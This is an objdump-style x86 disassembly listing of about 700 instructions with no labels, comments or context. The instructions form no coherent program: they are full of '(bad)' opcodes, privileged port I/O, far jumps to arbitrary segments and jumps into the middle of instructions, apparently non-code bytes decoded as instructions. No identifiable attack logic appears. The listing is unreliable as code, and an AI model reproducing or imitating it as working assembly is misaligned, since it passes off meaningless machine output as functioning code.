  407b4a:	ja     0x407b5c
  407b4c:	sbb    ecx,esi
  407b4e:	mov    ds:0x8933e54b,eax
  407b53:	out    0x2b,eax
  407b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b56:	dec    ebp
  407b57:	jmp    0x4d08fe3d
  407b5c:	aas    
  407b5d:	mov    edi,0x63184518
  407b62:	pop    esp
  407b63:	in     al,0x1d
  407b65:	and    DWORD PTR [edi-0x6c6fac61],0xfffffff8
  407b6c:	aas    
  407b6d:	or     eax,0x47783fab
  407b72:	dec    edx
  407b73:	xchg   ebp,eax
  407b74:	bound  ebx,QWORD PTR [eax+0x13c69fcb]
  407b7a:	push   es
  407b7b:	dec    esp
  407b7c:	xchg   edi,eax
  407b7d:	cmp    ch,BYTE PTR [ecx-0xe973b10]
  407b83:	not    BYTE PTR [edi]
  407b85:	add    ah,BYTE PTR [ebx]
  407b87:	pop    ss
  407b88:	(bad)
  407b8b:	cmp    al,0x80
  407b8d:	inc    eax
  407b8e:	loopne 0x407b4a
  407b90:	(bad)  [ebp+0x60]
  407b93:	add    eax,0xeb183de7
  407b98:	dec    edx
  407b99:	pusha  
  407b9a:	aad    0x84
  407b9c:	pushf  
  407b9d:	sbb    eax,0xeafae176
  407ba2:	pop    edx
  407ba3:	mov    esp,0xaf5ebabb
  407ba8:	ffreep st(1)
  407baa:	cmp    esi,edi
  407bac:	cmp    eax,0xc40de5d2
  407bb1:	jns    0x407bf1
  407bb3:	pop    eax
  407bb4:	rcr    BYTE PTR [ecx+0x1e],0x9f
  407bb8:	inc    edi
  407bb9:	pop    ebx
  407bba:	lods   al,BYTE PTR ds:[esi]
  407bbb:	mov    eax,ds:0x573e9f4d
  407bc0:	gs sti 
  407bc2:	ins    BYTE PTR es:[edi],dx
  407bc3:	das    
  407bc4:	jb     0x407bea
  407bc6:	daa    
  407bc7:	or     ecx,DWORD PTR [edx+0x1b11f6e8]
  407bcd:	or     eax,0xa0c8855f
  407bd2:	fisttp QWORD PTR [edx]
  407bd4:	js     0x407c3e
  407bd6:	mov    ecx,0xc2c4f0e1
  407bdb:	inc    ebx
  407bdc:	dec    edi
  407bdd:	inc    esi
  407bde:	je     0x407c5c
  407be0:	cs pushf 
  407be2:	push   esp
  407be3:	add    eax,0xae2b4fe5
  407be8:	stos   BYTE PTR es:[edi],al
  407be9:	popf   
  407bea:	ins    BYTE PTR es:[edi],dx
  407beb:	xor    DWORD PTR [eax-0x681d13c],0x53d0a43f
  407bf5:	and    al,0xbf
  407bf7:	sub    al,0xdf
  407bf9:	mov    BYTE PTR [eax],bh
  407bfb:	pop    esp
  407bfc:	push   ebp
  407bfd:	pusha  
  407bfe:	xor    ebp,DWORD PTR [edi]
  407c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c01:	jne    0x407c65
  407c03:	jp     0x407bea
  407c05:	add    edi,ebp
  407c07:	cli    
  407c08:	test   BYTE PTR [ebx],cl
  407c0a:	jb     0x407c3a
  407c0c:	lea    edx,[ebx]
  407c0e:	dec    edx
  407c0f:	data16 jno 0x407c06
  407c12:	inc    ebp
  407c13:	scas   eax,DWORD PTR es:[edi]
  407c14:	xchg   BYTE PTR [esi],dl
  407c16:	sub    DWORD PTR ds:0xa99dd882,ebx
  407c1c:	mov    dl,BYTE PTR [eax+0x4df2130b]
  407c22:	out    dx,al
  407c23:	and    al,0x89
  407c25:	or     eax,0x1f3a02b6
  407c2a:	pop    esp
  407c2b:	arpl   WORD PTR [esi],sp
  407c2d:	popa   
  407c2e:	pop    edx
  407c2f:	adc    edx,edi
  407c31:	inc    ecx
  407c32:	sub    dh,BYTE PTR [ebx+0x3c]
  407c35:	pop    esi
  407c36:	sbb    DWORD PTR [ecx+0x3d],ebx
  407c39:	mov    ?,WORD PTR [ebx-0x66]
  407c3c:	pop    esi
  407c3d:	out    0x9a,al
  407c3f:	out    0x37,eax
  407c41:	fcmovnb st,st(1)
  407c43:	pop    ss
  407c44:	fcomp  QWORD PTR [edi+ebx*4+0xe]
  407c48:	or     eax,0xf018dac8
  407c4d:	jg     0x407c40
  407c4f:	dec    ebp
  407c50:	and    al,0xaa
  407c52:	or     eax,0x27908df
  407c57:	test   DWORD PTR [ecx],esp
  407c59:	jno    0x407c8d
  407c5b:	aas    
  407c5c:	imul   edi,DWORD PTR [esi+0x4d],0x3
  407c60:	or     BYTE PTR [ebx+0x40],0x7a
  407c64:	daa    
  407c65:	pop    edi
  407c66:	jg     0x407c59
  407c68:	cld    
  407c69:	pusha  
  407c6a:	xchg   ecx,eax
  407c6b:	clc    
  407c6c:	retf   
  407c6d:	icebp  
  407c6e:	mov    al,ds:0x48ed37fd
  407c73:	pop    ebx
  407c74:	cwde   
  407c75:	cmp    ch,BYTE PTR [edi+ebp*2-0x10308fe0]
  407c7c:	cmp    al,0x44
  407c7e:	sbb    eax,0x916234d6
  407c83:	pop    es
  407c84:	xor    cl,ch
  407c86:	dec    esi
  407c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c88:	jmp    0xd407c1e8
  407c8d:	push   0xf84291e6
  407c92:	sub    DWORD PTR [ebx+edi*4],ebx
  407c95:	icebp  
  407c96:	jne    0x407c51
  407c98:	add    ecx,ecx
  407c9a:	stos   BYTE PTR es:[edi],al
  407c9b:	push   cs
  407c9c:	je     0x407d15
  407c9e:	ret    
  407c9f:	mov    eax,ds:0x4a719777
  407ca4:	inc    ebp
  407ca5:	stos   BYTE PTR es:[edi],al
  407ca6:	lods   al,BYTE PTR ds:[esi]
  407ca7:	mov    al,ds:0xeeebf2d9
  407cac:	cwde   
  407cad:	inc    ebp
  407cae:	jbe    0x407d00
  407cb0:	inc    edx
  407cb1:	sti    
  407cb2:	ja     0x407ced
  407cb4:	cmp    DWORD PTR ds:[esi-0x7a],ebp
  407cb8:	(bad)  
  407cb9:	or     cl,bl
  407cbb:	adc    DWORD PTR [edi+0x71],edi
  407cbe:	xor    esi,DWORD PTR [eax+0x362fedf]
  407cc4:	inc    esp
  407cc5:	js     0x407cf3
  407cc7:	jns    0x407cc5
  407cc9:	or     eax,0xb01e2c6d
  407cce:	test   al,0x27
  407cd0:	adc    ch,BYTE PTR [ecx-0x4a]
  407cd3:	repz inc eax
  407cd5:	adc    DWORD PTR [ebx],0x76080551
  407cdb:	add    edi,ebp
  407cdd:	call   0x16aa53b9
  407ce2:	leave  
  407ce3:	adc    al,0x26
  407ce5:	shl    DWORD PTR [edx],0x8a
  407ce8:	jns    0x407d60
  407cea:	pop    ebp
  407ceb:	iret   
  407cec:	jne    0x407cf4
  407cee:	dec    eax
  407cef:	sub    bl,BYTE PTR [eax+0x11e86e98]
  407cf5:	clc    
  407cf6:	pushf  
  407cf7:	add    DWORD PTR [ecx],ecx
  407cf9:	push   ds
  407cfa:	test   al,0xe7
  407cfc:	outs   dx,BYTE PTR ds:[esi]
  407cfd:	adc    DWORD PTR [ebx-0x12f8898],esi
  407d03:	ficom  DWORD PTR [ecx]
  407d05:	sub    edx,DWORD PTR [edx]
  407d07:	int    0x38
  407d09:	pop    ecx
  407d0a:	jp     0x407d7b
  407d0c:	pop    eax
  407d0d:	aam    0x1a
  407d0f:	mov    WORD PTR [bp-0x5f58],ss
  407d14:	cmp    al,0x43
  407d16:	inc    edx
  407d17:	loop   0x407d2d
  407d19:	bound  ebp,QWORD PTR [eax+0x6a]
  407d1c:	cmp    ecx,DWORD PTR ds:0x588f6533
  407d22:	cdq    
  407d23:	les    edx,FWORD PTR [edi+0x48]
  407d26:	sub    DWORD PTR [edx-0x536e428a],esi
  407d2c:	mov    ch,0xfe
  407d2e:	(bad)  
  407d2f:	xchg   ecx,eax
  407d30:	xor    edi,DWORD PTR [ebx-0x1bd6b5ab]
  407d36:	mov    ds:0x1e97b145,al
  407d3b:	sahf   
  407d3c:	shr    BYTE PTR [ebx+0x6a269cb8],1
  407d42:	xor    dh,BYTE PTR [ebp-0x6c86abc0]
  407d48:	stos   DWORD PTR es:[edi],eax
  407d49:	or     eax,0x8b898087
  407d4e:	je     0x407cd6
  407d50:	or     BYTE PTR [eax-0x5d],bh
  407d53:	xchg   DWORD PTR [edx-0x71],eax
  407d56:	(bad)  
  407d57:	cmp    ah,BYTE PTR [eax-0x6e]
  407d5a:	mov    esi,0xc3de921d
  407d5f:	(bad)  
  407d60:	xor    dh,al
  407d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d63:	test   BYTE PTR [ecx-0x61],dl
  407d66:	cli    
  407d67:	pop    ss
  407d68:	jbe    0x407dbd
  407d6a:	ds cld 
  407d6c:	shr    DWORD PTR [eax+0x31],0x18
  407d70:	or     al,0x65
  407d72:	and    DWORD PTR [ecx],ecx
  407d74:	and    esp,eax
  407d76:	rol    DWORD PTR [eax-0x15],cl
  407d79:	sahf   
  407d7a:	clc    
  407d7b:	jne    0x407d21
  407d7d:	jg     0x407d78
  407d7f:	xchg   edi,eax
  407d80:	xor    al,0x7b
  407d82:	inc    ecx
  407d83:	mov    ds:0x17528f79,eax
  407d88:	jecxz  0x407d54
  407d8a:	ss fwait
  407d8c:	jecxz  0x407de1
  407d8e:	(bad)  
  407d8f:	pop    ebp
  407d90:	repz cmp al,0xfa
  407d93:	and    al,0xe9
  407d95:	add    DWORD PTR [eax-0x4c054320],ecx
  407d9b:	(bad)  
  407d9c:	pop    DWORD PTR [esi]
  407d9e:	cmp    ebx,esi
  407da0:	push   es
  407da1:	sub    cl,dl
  407da3:	pop    ecx
  407da4:	sahf   
  407da5:	xchg   esp,eax
  407da6:	(bad)  
  407da7:	sbb    al,0x46
  407da9:	aad    0x9b
  407dab:	lea    eax,[edx+esi*4]
  407dae:	cmp    BYTE PTR [ebx+0x2d],0xa7
  407db2:	inc    eax
  407db3:	push   ebx
  407db4:	pop    ebp
  407db5:	or     al,0x3
  407db7:	daa    
  407db8:	xchg   ebp,eax
  407db9:	retf   0x137d
  407dbc:	mov    cl,0x1
  407dbe:	retf   
  407dbf:	xchg   edi,eax
  407dc0:	ror    BYTE PTR [eiz*8-0xf5837a1],0x72
  407dc8:	outs   dx,BYTE PTR ds:[esi]
  407dc9:	sub    DWORD PTR [edi+0x4e],edi
  407dcc:	paddw  mm0,QWORD PTR gs:[esi-0x4e21377]
  407dd4:	mov    dl,0x24
  407dd6:	out    dx,al
  407dd7:	(bad)
  407ddb:	out    dx,al
  407ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ddd:	fld    TBYTE PTR [esi]
  407ddf:	in     al,dx
  407de0:	ins    BYTE PTR es:[edi],dx
  407de1:	ret    0x180b
  407de4:	push   ss
  407de5:	jbe    0x407e0a
  407de7:	outs   dx,DWORD PTR ds:[esi]
  407de8:	ins    BYTE PTR es:[edi],dx
  407de9:	imul   ecx,DWORD PTR [ebp-0x37],0xffffffe1
  407ded:	inc    edx
  407dee:	cmp    al,0xad
  407df0:	xor    WORD PTR [edi-0x49d5b096],0x2d
  407df8:	or     al,0xa1
  407dfa:	ud1    esp,DWORD PTR [ebp+0x5a]
  407dfe:	inc    ebp
  407dff:	clc    
  407e00:	out    dx,al
  407e01:	cwde   
  407e02:	add    eax,0x6a35d14c
  407e07:	fsubr  QWORD PTR [ebx]
  407e09:	inc    eax
  407e0a:	pop    ebx
  407e0b:	lods   al,BYTE PTR ds:[esi]
  407e0c:	fcom   QWORD PTR [ecx+0xe410e6d]
  407e12:	sbb    BYTE PTR [edx-0x22bc9be5],dl
  407e18:	xchg   ebx,ecx
  407e1a:	sub    al,0xd8
  407e1c:	mov    ds:0xb51c0fbd,al
  407e21:	or     al,0x23
  407e23:	push   eax
  407e24:	xor    ecx,DWORD PTR [esi+0x7a43eed7]
  407e2a:	xor    cl,BYTE PTR [eax+edx*4]
  407e2d:	imul   eax,DWORD PTR [esi-0x1741a90],0x25
  407e34:	cwde   
  407e35:	mov    WORD PTR [esi+0x4097f679],?
  407e3b:	enter  0xe777,0xbc
  407e3f:	push   DWORD PTR [edi-0x3eddcf51]
  407e45:	jmp    0x407e98
  407e47:	inc    esi
  407e48:	jmp    0x19fa:0x5d9b770f
  407e4f:	mov    al,ds:0xf6f6c9d0
  407e54:	add    esi,ecx
  407e56:	mov    esi,0x7c48f965
  407e5b:	shl    BYTE PTR [esp+edi*1],1
  407e5e:	stos   BYTE PTR es:[edi],al
  407e5f:	push   es
  407e60:	sti    
  407e61:	sub    dl,BYTE PTR [ebp-0x1e2f5d75]
  407e67:	popf   
  407e68:	lea    edx,[edi+0x62]
  407e6b:	or     al,0x5c
  407e6d:	mov    ds:0x458b98ed,al
  407e72:	in     al,dx
  407e73:	stos   DWORD PTR es:[edi],eax
  407e74:	add    DWORD PTR [edi+0x31331909],ebx
  407e7a:	inc    ebx
  407e7b:	scas   eax,DWORD PTR es:[edi]
  407e7c:	in     eax,dx
  407e7d:	or     al,cl
  407e7f:	or     BYTE PTR [ebx-0x11e8a1a1],ah
  407e85:	and    esp,0xffffff9f
  407e88:	bnd jge 0x407e94
  407e8b:	push   ss
  407e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e8d:	jb     0x407e89
  407e8f:	or     DWORD PTR [edx+eiz*8+0x76453ef4],esp
  407e96:	test   BYTE PTR [edi+ebx*8],0x92
  407e9a:	shl    BYTE PTR [edx-0x7d],1
  407e9d:	adc    al,dh
  407e9f:	aaa    
  407ea0:	pop    es
  407ea1:	lahf   
  407ea2:	int3   
  407ea3:	pop    ds
  407ea4:	mov    al,0x5d
  407ea6:	pop    edx
  407ea7:	(bad)  
  407ea8:	push   ds
  407ea9:	mov    al,ds:0xb857dba4
  407eae:	sbb    ah,BYTE PTR [ebp+0x5feaefc5]
  407eb4:	dec    edx
  407eb5:	cdq    
  407eb6:	out    0x3b,al
  407eb8:	cmc    
  407eb9:	or     BYTE PTR ds:0x64beff1d,0x1e
  407ec0:	adc    BYTE PTR [ebp+0x4d6b3e09],bl
  407ec6:	sub    ecx,esi
  407ec8:	jmp    0x8253:0xebc577bc
  407ecf:	sub    eax,0xb48f2804
  407ed4:	pop    ecx
  407ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ed6:	outs   dx,DWORD PTR ds:[esi]
  407ed7:	sub    dh,BYTE PTR [edx-0x3255689f]
  407edd:	sub    eax,0xa85930d4
  407ee2:	pop    edi
  407ee3:	and    ecx,ecx
  407ee5:	(bad)  
  407ee6:	mov    al,ds:0xb525299b
  407eeb:	lds    esi,FWORD PTR [ecx+0x7c]
  407eee:	cli    
  407eef:	in     eax,dx
  407ef0:	cmp    ah,BYTE PTR [esi-0x444e6638]
  407ef6:	ja     0x407e95
  407ef8:	sbb    DWORD PTR [edi],edx
  407efa:	inc    ebp
  407efb:	push   DWORD PTR [ecx]
  407efd:	call   0x868:0xdde919e
  407f04:	ret    
  407f05:	(bad)  
  407f06:	adc    al,0x66
  407f08:	and    ah,al
  407f0a:	pop    edi
  407f0b:	or     dl,BYTE PTR [eax]
  407f0d:	retf   0x5942
  407f10:	add    al,0x42
  407f12:	xchg   ecx,eax
  407f13:	xchg   ebx,eax
  407f14:	pop    edx
  407f15:	jae    0x407f4e
  407f17:	mov    dl,0xf
  407f19:	dec    ecx
  407f1a:	cmp    BYTE PTR [esi+0xb9d8a15],ch
  407f20:	dec    esp
  407f21:	add    BYTE PTR [ebp-0x38],dh
  407f24:	fimul  WORD PTR [esi]
  407f26:	sti    
  407f27:	lea    edx,[edx]
  407f29:	inc    edi
  407f2a:	mov    ebp,0xffaf45cf
  407f30:	sub    edx,DWORD PTR [edx]
  407f32:	retf   
  407f33:	cmp    eax,0x56b338ff
  407f38:	into   
  407f39:	(bad)  
  407f3a:	push   ebx
  407f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f3d:	or     cl,BYTE PTR [esi+edx*1]
  407f40:	aaa    
  407f41:	xor    BYTE PTR [ecx+0x3434e841],dh
  407f47:	js     0x407f18
  407f49:	je     0x407ecc
  407f4b:	push   ebx
  407f4c:	loopne 0x407f64
  407f4e:	mov    ch,0xcd
  407f50:	or     ch,BYTE PTR [edi-0x3616b936]
  407f56:	popf   
  407f57:	and    ecx,0x13502326
  407f5d:	test   ch,bh
  407f5f:	jmp    0xbff8:0x3d3ed9f
  407f66:	mov    ah,0xdc
  407f68:	in     eax,dx
  407f69:	outs   dx,BYTE PTR ds:[esi]
  407f6a:	fwait
  407f6b:	int    0x64
  407f6d:	inc    ecx
  407f6e:	ins    BYTE PTR es:[edi],dx
  407f6f:	rcl    DWORD PTR [edi-0x55e04e4c],cl
  407f75:	mov    esi,DWORD PTR [edx]
  407f77:	xlat   BYTE PTR ds:[ebx]
  407f78:	dec    edx
  407f79:	mov    dh,0xc3
  407f7b:	xor    BYTE PTR [ebp+0x58],0xd7
  407f7f:	pusha  
  407f80:	or     al,0xf9
  407f82:	mov    eax,0x45aa7b0d
  407f87:	cli    
  407f88:	cmp    eax,0xc15ac1b7
  407f8d:	nop
  407f8e:	mov    ds:0x4aee3686,al
  407f93:	push   0xfffffffa
  407f95:	leave  
  407f96:	jp     0x407f56
  407f98:	jo     0x407f60
  407f9a:	pop    ecx
  407f9b:	mov    ch,0xe3
  407f9d:	push   edi
  407f9e:	and    dl,BYTE PTR [ecx]
  407fa0:	adc    dl,BYTE PTR [edx+0x50c86dfb]
  407fa6:	inc    ecx
  407fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fa8:	jae    0x407fa4
  407faa:	sub    bl,BYTE PTR [edi]
  407fac:	ds mov bl,0xb6
  407faf:	call   0x7b31:0x5aefa38f
  407fb6:	lock dec ebx
  407fb8:	cmp    ebp,eax
  407fba:	loope  0x407f45
  407fbc:	jle    0x407fc0
  407fbe:	std    
  407fbf:	sbb    eax,0x53b38096
  407fc4:	mov    ds:0xbf935bf9,eax
  407fc9:	mov    eax,0x48fa1f31
  407fce:	(bad)  
  407fcf:	adc    eax,0x41de6c2a
  407fd4:	stos   BYTE PTR es:[edi],al
  407fd5:	jnp    0x407f6c
  407fd7:	fisub  WORD PTR [ebx+0x3bccd2dd]
  407fdd:	xchg   edi,eax
  407fde:	xchg   edi,eax
  407fdf:	ficomp WORD PTR [esi+0x19]
  407fe2:	in     al,0x9c
  407fe4:	sbb    al,0xac
  407fe6:	call   0x42d4:0xed8c4af3
  407fed:	cdq    
  407fee:	jb     0x407f92
  407ff0:	loope  0x407f95
  407ff2:	repnz fdivr st(5),st
  407ff5:	js     0x408053
  407ff7:	push   es
  407ff8:	repnz mov ch,bl
  407ffb:	cmp    eax,0x1edd9479
  408000:	nop
  408001:	xor    DWORD PTR [esi+ebp*1],edx
  408004:	push   edi
  408005:	cld    
  408006:	jg     0x407fdc
  408008:	(bad)  
  408009:	add    al,0x99
  40800b:	in     al,dx
  40800c:	mov    edx,0xf2f8cef4
  408011:	retf   
  408012:	mov    cl,BYTE PTR [esi+0x6d]
  408015:	ins    BYTE PTR es:[edi],dx
  408016:	cmp    ah,0x39
  408019:	(bad)  
  40801a:	outs   dx,DWORD PTR ds:[esi]
  40801b:	out    dx,al
  40801c:	pop    edi
  40801d:	or     ch,BYTE PTR fs:[ebx]
  408020:	push   cs
  408021:	and    al,0xc9
  408023:	xchg   ebx,eax
  408024:	shl    DWORD PTR ds:0xba3417ba,0x3d
  40802b:	lds    eax,FWORD PTR [ebp+0x35]
  40802e:	arpl   WORD PTR [edi-0x3],cx
  408031:	mov    al,ds:0xa6e62479
  408036:	sbb    eax,0x97e6a762
  40803b:	xor    eax,0x21a60bf2
  408040:	mov    dl,0x6f
  408042:	pop    edi
  408043:	repz retf 0x803b
  408047:	test   al,0xfd
  408049:	aaa    
  40804a:	sub    BYTE PTR [ebx],al
  40804c:	pop    edi
  40804d:	and    DWORD PTR [edx+0x3cd57d11],0x49
  408054:	(bad)  
  408055:	shr    DWORD PTR [ecx+ebx*8],cl
  408058:	scas   al,BYTE PTR es:[edi]
  408059:	fdiv   QWORD PTR [edi-0x33]
  40805c:	adc    DWORD PTR [ebp+0x30],eax
  40805f:	enter  0x8863,0x16
  408063:	aad    0x25
  408065:	or     al,dh
  408067:	ins    DWORD PTR es:[edi],dx
  408068:	adc    ch,bh
  40806a:	xor    BYTE PTR [ecx],dl
  40806c:	xor    eax,0x8320128d
  408071:	adc    ecx,ecx
  408073:	mov    esp,0x1469e8c1
  408078:	(bad)  
  408079:	sub    bl,dh
  40807b:	shr    esp,0x20
  40807e:	mov    esi,0xa7e07e6f
  408083:	pop    ds
  408084:	sub    ah,ch
  408086:	lds    edx,FWORD PTR [edi+eax*4-0xa6bbdee]
  40808d:	outs   dx,DWORD PTR ds:[esi]
  40808e:	jmp    0x6e4:0x7d069d55
  408095:	push   ss
  408096:	inc    edi
  408097:	push   cs
  408098:	mov    edi,0xb2859b3d
  40809d:	jne    0x408103
  40809f:	mov    edx,0x327791a4
  4080a4:	add    ecx,edx
  4080a6:	cld    
  4080a7:	pop    eax
  4080a8:	dec    eax
  4080a9:	mov    eax,ds:0x45bab241
  4080ae:	dec    ebp
  4080af:	dec    ecx
  4080b0:	dec    ebp
  4080b1:	dec    eax
  4080b2:	outs   dx,DWORD PTR ds:[esi]
  4080b3:	add    DWORD PTR [ebp-0x2b],0xffffffce
  4080b7:	fs call 0xa8b2:0x3f8a549b
  4080bf:	icebp  
  4080c0:	in     eax,0x11
  4080c2:	jns    0x4080e9
  4080c4:	inc    eax
  4080c5:	jnp    0x4080c4
  4080c7:	retf   
  4080c8:	xchg   ecx,eax
  4080c9:	push   eax
  4080ca:	pop    esi
  4080cb:	or     eax,DWORD PTR [edi+0x5f34d2f5]
  4080d1:	and    eax,0x3cfd9b43
  4080d6:	jae    0x408105
  4080d8:	xchg   esp,eax
  4080d9:	sbb    al,BYTE PTR [eax+eiz*2]
  4080dc:	jbe    0x4080af
  4080de:	popa   
  4080df:	retf   
  4080e0:	scas   eax,DWORD PTR es:[edi]
  4080e1:	(bad)  [eax+0x1b]
  4080e4:	(bad)  
  4080e5:	xor    eax,0x615e14a3
  4080ea:	dec    edi
  4080eb:	xor    eax,0x83f11331
  4080f0:	pop    eax
  4080f1:	nop
  4080f2:	cdq    
  4080f3:	jp     0x408133
  4080f5:	into   
  4080f6:	(bad)  
  4080f7:	pop    edi
  4080f8:	pop    ecx
  4080f9:	pop    edi
  4080fa:	inc    eax
  4080fb:	xchg   ebx,eax
  4080fc:	sbb    ecx,esi
  4080fe:	xchg   DWORD PTR [eax],edx
  408100:	inc    esi
  408101:	push   es
  408102:	xchg   edx,eax
  408103:	arpl   sp,bx
  408105:	out    dx,al
  408106:	push   edx
  408107:	jl     0x408123
  408109:	icebp  
  40810a:	(bad)  
  40810b:	ret    
  40810c:	xchg   eax,eax
  40810e:	or     esp,esp
  408110:	adc    BYTE PTR [edi+0x77],bh
  408113:	scas   al,BYTE PTR es:[edi]
  408114:	xchg   ebp,eax
  408115:	ds jl  0x40817e
  408118:	sub    eax,0x854e3ae5
  40811d:	push   edx
  40811e:	pop    ebp
  40811f:	lods   al,BYTE PTR ds:[esi]
  408120:	inc    edx
  408121:	add    eax,0xa7de5481
  408126:	mov    cl,0xa5
  408128:	jbe    0x408103
  40812a:	and    BYTE PTR [ebp+0x58],bl
  40812d:	mov    dh,0xd8
  40812f:	jmp    0x408193
  408131:	dec    edi
  408132:	mov    esp,0x2a5fdd8f
  408137:	or     esp,DWORD PTR [ebx+0x61480eb1]
  40813d:	pop    esi
  40813e:	mov    dh,0xe8
  408140:	pop    ds
  408141:	loopne 0x4081b9
  408143:	mov    al,ds:0xc1e55e76
  408148:	scas   eax,DWORD PTR es:[edi]
  408149:	mov    ebp,0xaaf7b068
  40814e:	mov    bh,0x75
  408150:	in     eax,0xe0
  408152:	loop   0x4081ab
  408154:	add    al,0x2a
  408156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408157:	adc    ch,BYTE PTR [ebx]
  408159:	sbb    ebx,eax
  40815b:	ja     0x4080fd
  40815d:	test   eax,0xc2054f3d
  408162:	push   ebx
  408163:	push   cs
  408164:	xlat   BYTE PTR ds:[ebx]
  408165:	sub    al,0xc1
  408167:	pop    ebx
  408168:	pop    es
  408169:	sub    al,0x65
  40816b:	inc    esp
  40816c:	aad    0xa6
  40816e:	cmp    dh,ch
  408170:	cwde   
  408171:	push   edi
  408172:	loop   0x4081dc
  408174:	shl    BYTE PTR [eax],0xb9
  408177:	call   FWORD PTR [esp+0x7822316e]
  40817e:	mov    esp,fs
  408180:	stc    
  408181:	in     eax,dx
  408182:	pop    ebp
  408183:	popf   
  408184:	cmp    DWORD PTR [eax-0x2ccc9a23],ecx
  40818a:	inc    eax
  40818b:	pusha  
  40818c:	jg     0x4081fa
  40818e:	jae    0x4081c5
  408190:	das    
  408191:	pusha  
  408192:	cmc    
  408193:	adc    BYTE PTR [edi-0x2e072369],0x57
  40819a:	jl     0x408121
  40819c:	xchg   ebx,eax
  40819d:	push   0xa1edd23a
  4081a2:	fucomip st,st(3)
  4081a4:	jae    0x40815d
  4081a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a7:	test   eax,0xc3c89038
  4081ac:	popa   
  4081ad:	dec    si
  4081af:	es das 
  4081b1:	inc    esi
  4081b2:	ret    
  4081b3:	mov    bl,ch
  4081b5:	and    esi,DWORD PTR [edx+0xcc10c95]
  4081bb:	adc    dl,BYTE PTR es:[esi+0x4f]
  4081bf:	push   eax
  4081c0:	add    BYTE PTR ds:0xeef262bb,dh
  4081c6:	pop    ecx
  4081c7:	out    dx,eax
  4081c8:	ret    
  4081c9:	loope  0x408219
  4081cb:	sbb    BYTE PTR [ecx+0x2b1e7f9c],0xd7
  4081d2:	mov    ds:0xdc58569,al
  4081d7:	call   0xefc5b178
  4081dc:	adc    BYTE PTR [ecx+edi*4+0x29],al
  4081e0:	(bad)  
  4081e1:	loopne 0x40819a
  4081e3:	push   edx
  4081e4:	push   ebp
  4081e5:	bound  ebp,QWORD PTR [esi-0x2b]
  4081e8:	sub    al,0xd4
  4081ea:	push   edx
  4081eb:	repz scas al,BYTE PTR es:[edi]
  4081ed:	pop    esp
  4081ee:	xor    BYTE PTR [esi+0x1008599e],bh
  4081f4:	xchg   ecx,eax
  4081f5:	jo     0x40821a
  4081f7:	test   DWORD PTR [edi],edx
  4081f9:	jmp    0xc57d1864
  4081fe:	test   eax,0xc6eb77ce
  408203:	call   0xa373fabb
  408208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40820a:	pop    edx
  40820b:	stos   DWORD PTR es:[edi],eax
  40820c:	adc    bh,BYTE PTR [edi+0x24]
  40820f:	cmc    
  408210:	nop
  408211:	and    eax,0x8285f1d3
  408216:	dec    esi
  408217:	push   ecx
  408218:	mov    eax,0xed14ebb8
  40821d:	add    esp,esp
  40821f:	mov    eax,0x51e62aba
  408224:	popf   
  408225:	aas    
  408226:	mov    DWORD PTR [edi],edx
  408228:	scas   al,BYTE PTR es:[edi]
  408229:	mul    BYTE PTR [edi+0x53ec1c48]
  40822f:	ja     0x40827a
  408231:	in     al,dx
  408232:	jns    0x4081e6
  408234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408235:	popa   
  408236:	push   ecx
  408237:	pop    edx
  408238:	mov    al,0xe9
  40823a:	cmp    DWORD PTR [esi+0x7f],ebp
  40823d:	mov    al,ds:0x22a9e717
  408243:	stos   DWORD PTR es:[edi],eax
  408244:	das    
  408245:	xlat   BYTE PTR ds:[ebx]
  408246:	test   al,0x9c
  408248:	outs   dx,DWORD PTR ds:[esi]
  408249:	retf   0xedd2
  40824c:	fxtract 
  40824e:	sbb    ah,BYTE PTR [edx]
  408250:	outs   dx,DWORD PTR ds:[esi]
  408251:	(bad)  
  408252:	adc    ebx,DWORD PTR [eax+0x337868ba]
  408258:	pop    ss
  408259:	xchg   esp,eax
  40825a:	out    0x7,eax
  40825c:	mov    esp,0xfbde126f
  408261:	stos   BYTE PTR es:[edi],al
  408262:	mov    dh,0xac
  408264:	loope  0x4082cc
  408266:	fistp  WORD PTR [esi+0x798caf8f]
  40826c:	add    cl,BYTE PTR [esi+ebp*4]
  40826f:	out    0x20,eax
  408271:	rcl    DWORD PTR [edi-0x6b37cd76],cl
  408277:	jle    0x40825a
  408279:	maskmovq mm5,(bad)
  40827a:	imul   DWORD PTR [eax-0x6c9cc015]
  408280:	rcl    DWORD PTR ds:0xbe24faeb,0x8c
  408287:	adc    al,0xe2
  408289:	mov    edi,?
  40828b:	lock mov ch,BYTE PTR [edi+0x5a]
  40828f:	ret    0x4c78
  408292:	xor    esp,DWORD PTR [ebp+0x3c833ac4]
  408298:	ss sar esp,1
  40829b:	mov    ecx,edi
  40829d:	inc    ecx
  40829e:	aam    0x5f
  4082a0:	mov    ?,WORD PTR [ecx]
  4082a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082a3:	adc    BYTE PTR [edx],dh
  4082a5:	dec    ebp
  4082a6:	push   0xffffff96
  4082a8:	in     eax,dx
  4082a9:	stc    
  4082aa:	jecxz  0x4082e8
  4082ac:	push   ss
  4082ad:	mov    ebx,0xe8991a52
  4082b2:	jmp    0x6984595b
  4082b7:	stc    
  4082b8:	mov    ecx,0xb7bd49f8
  4082bd:	mov    bh,0xf0
  4082bf:	loop   0x4082d8
  4082c1:	cmp    DWORD PTR [esi],ebx
  4082c3:	mov    dl,dl
  4082c5:	test   DWORD PTR [esi],ebx
  4082c7:	ins    DWORD PTR es:[edi],dx
  4082c8:	out    0x61,eax
  4082ca:	(bad)  
  4082cc:	frstor [esi+0x4c0361c3]
  4082d2:	loop   0x4082f8
